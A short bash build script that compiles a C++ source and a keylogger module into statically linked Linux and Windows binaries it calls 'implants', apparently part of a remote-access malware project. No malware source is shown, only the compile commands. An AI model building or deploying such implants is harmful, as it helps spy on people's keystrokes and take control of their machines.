#!/bin/bash


src="main.cpp ./includes/keylogger.c"

# for linux
linux_out="agent_r"
#gcc $src -o $linux_out -lcjson --static -lcrypto -lssl
gcc $src -o $linux_out -static -lcjson -lssl -lcrypto -ldl -lpthread
echo "[+] LINUX IMPLANT DONE\n" 


# windows
win_out="implant_r"
i686-w64-mingw32-g++ -Wall -O2 -ffunction-sections -fdata-sections -fmerge-all-constants \
                    -static-libstdc++ -static-libgcc ./includes/cJSON/cJSON.c \
                    $src -o $win_out -lws2_32 -lsecur32
echo "[+] WINDOWS IMPLANT DONE\n"
